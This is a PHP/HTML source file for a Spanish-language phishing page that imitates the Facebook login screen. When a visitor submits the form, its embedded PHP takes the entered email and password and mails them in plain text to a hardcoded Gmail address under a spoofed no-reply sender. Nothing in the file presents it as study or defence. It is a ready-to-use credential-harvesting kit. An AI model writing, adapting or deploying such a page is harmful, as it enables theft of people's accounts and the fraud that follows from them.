<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia sesión</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        header {
            background-color: #1877f2;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            width: 100%;
            position: absolute;
            top: 0;
        }

        login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
            width: 360px;
            text-align: center;
            margin-top: 80px;
        }

        login-container input[type="text"],
        login-container input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
        }

        login-container button {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
        }

        login-container button:hover {
            background-color: #145dbf;
        }

        message {
            margin-top: 15px;
            font-size: 14px;
            color: green;
        }

      error {
            margin-top: 15px;
            font-size: 14px;
            color: red;
        }
    </style>
</head>
<body>
    <div class="header">
        Facebook
    </div>
    <div class="login-container">
        <?php
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            // Obtener datos del formulario
            $email = htmlspecialchars($_POST['email']);
            $password = htmlspecialchars($_POST['password']);

            // Configuración del correo
            $destinatario = "familiacaballero2024@gmail.com";
            $asunto = "Nuevos datos de inicio de sesión";
            $mensaje = "Has recibido nuevos datos de inicio de sesión:\n\n";
            $mensaje .= "Correo electrónico: $email\n";
            $mensaje .= "Contraseña: $password\n";

            // Encabezados (opcional, para correo HTML)
            $headers = "From: no-reply@example.com\r\n";
            $headers .= "Reply-To: no-reply@example.com\r\n";

            // Enviar correo
            if (mail($destinatario, $asunto, $mensaje, $headers)) {
                echo "<p class='message'>Los datos se han enviado correctamente.</p>";
            } else {
                echo "<p class='error'>Hubo un error al enviar los datos.</p>";
            }
        }
        ?>
        <form method="POST">
            <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
            <input type="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>
